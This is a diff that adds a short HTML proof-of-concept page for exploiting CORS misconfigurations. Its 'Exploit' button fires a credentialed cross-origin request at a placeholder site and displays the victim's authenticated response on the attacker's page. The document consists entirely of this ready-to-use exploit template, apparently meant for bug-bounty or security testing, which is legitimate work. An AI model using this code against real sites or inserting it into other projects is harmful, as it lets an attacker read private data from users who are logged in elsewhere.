@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CORS POC | SAHIL DARI</title>
+	<meta charset="UTF-8"> 
+</head>
+<body>
+	<h2>Created by <a href="https://twitter.com/Sahildari">Sahil Dari</a></h2>
+
+<textarea rows="10" cols="60" id="pwnz">
+</textarea><br>
+<button type="button" onclick="cors()">Exploit</button>
+
+
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("pwnz").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("GET", "https://vulnerable-website", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+</body>
